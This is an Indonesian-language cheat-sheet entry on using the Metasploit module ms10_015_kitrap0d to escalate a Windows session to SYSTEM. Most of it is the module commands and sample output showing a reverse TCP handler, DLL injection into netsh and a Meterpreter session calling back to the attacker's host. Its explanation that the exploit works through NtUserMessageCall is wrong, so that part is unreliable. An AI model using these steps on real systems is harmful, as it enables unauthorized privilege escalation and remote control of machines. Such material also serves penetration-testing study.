# ms10_015_kitrap0d

Modul `ms10_015_kitrap0d` di Metasploit adalah modul `exploit local` untuk sistem Windows yang memanfaatkan kerentanan dalam pengelolaan privilege di kernel Windows (`MS10-015`), dikenal dengan nama `KiTrap0D`. Kerentanan ini memungkinkan user biasa untuk mengeskalasi hak akses ke level `SYSTEM` dengan menjalankan kode berizin tinggi melalui eksploitasi fungsi `NtUserMessageCall`.

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/ms10_015_kitrap0d
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 1936 launched.
[*] Reflectively injecting the DLL into 1936...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 192.168.1.54
[*] Meterpreter session 25 opened (192.168.1.11:4444 -> 192.168.1.54:1057) at 2025-05-17 08:10:04 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
